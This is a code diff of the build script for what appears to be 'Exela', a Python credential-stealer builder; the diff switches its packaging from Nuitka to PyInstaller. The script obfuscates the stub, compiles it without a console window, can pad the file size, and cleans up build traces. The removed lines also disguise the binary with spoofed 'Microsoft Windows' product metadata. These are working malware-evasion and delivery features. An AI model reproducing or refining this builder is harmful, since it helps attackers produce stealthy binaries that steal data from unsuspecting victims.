@@ -24,7 +24,7 @@ class Build:
         self.current_path = os.getcwd()
         self.pump = bool()
         self.pumSize = int()  # mb
-        self.NuitkaCommand = 'nuitka --assume-yes-for-downloads --onefile --windows-disable-console --company-name="Exela Corporation" --product-name="Microsoft® Windows® Operating System" --file-version="10.0.19041.746" --file-description="Exela Service" --copyright="© Exela Corporation. All rights reserved"'
+        self.PyInstallerCommand = 'pyinstaller --onefile --noconsole --noconfirm --upx-dir UPX --version-file AssemblyFile\\version.txt'
 
     def CallFuncions(self) -> None:
         try:
@@ -41,15 +41,15 @@ class Build:
             os.system("cls")
             self.ObfuscateFile("Stub.py")
             self.build_file()
-
+            shutil.copy("dist\\stub.exe", "stub.exe")
             if self.pump == True:
                 self.expand_file("stub.exe", self.pumSize)
             try:
                 # delete Junk Files & Directorys
-                shutil.rmtree("stub.onefile-build")
-                shutil.rmtree("stub.dist")
-                shutil.rmtree("stub.build")
+                shutil.rmtree("dist")
+                shutil.rmtree("build")
                 os.remove("stub.py")
+                os.remove("stub.spec")
             except:
                 pass
             if os.path.exists("stub.exe"):
@@ -99,12 +99,12 @@ class Build:
                 )
 
     def build_file(self) -> None:
-        os.system(self.NuitkaCommand)
+        os.system(self.PyInstallerCommand)
 
     def InstallModules(self) -> None:
         os.system("pip install cryptography")
         os.system("pip install aiohttp")
-        os.system("pip install nuitka")
+        os.system("pip install pyinstaller")
 
     def WriteSettings(self) -> None:
         with open("Exela.py", "r", encoding="utf-8", errors="ignore") as file:
@@ -133,23 +133,23 @@ class Build:
             )
             if not get_icon_path.endswith(".ico"):
                 print("pls use .ico file, now icon change has been disabled")
-                self.NuitkaCommand += " stub.py"
+                self.PyInstallerCommand += " stub.py"
             else:
                 if not os.path.isfile(get_icon_path):
                     print("file does not exist, icon change has been disabled.")
-                    self.NuitkaCommand += " stub.py"
+                    self.PyInstallerCommand += " stub.py"
                 else:
                     if self.CheckIcoFile(get_icon_path):
-                        self.NuitkaCommand += (
-                            f" --windows-icon-from-ico={get_icon_path} stub.py"
+                        self.PyInstallerCommand += (
+                            f" --icon={get_icon_path} stub.py"
                         )
                     else:
                         print(
                             "Your file doesnt current a ico file, icon change has been disabled"
                         )
-                        self.NuitkaCommand += " stub.py"
+                        self.PyInstallerCommand += " stub.py"
         else:
-            self.NuitkaCommand += " stub.py"
+            self.PyInstallerCommand += " stub.py"
 
     def CheckIcoFile(self, file_path: str) -> bool:
         try:
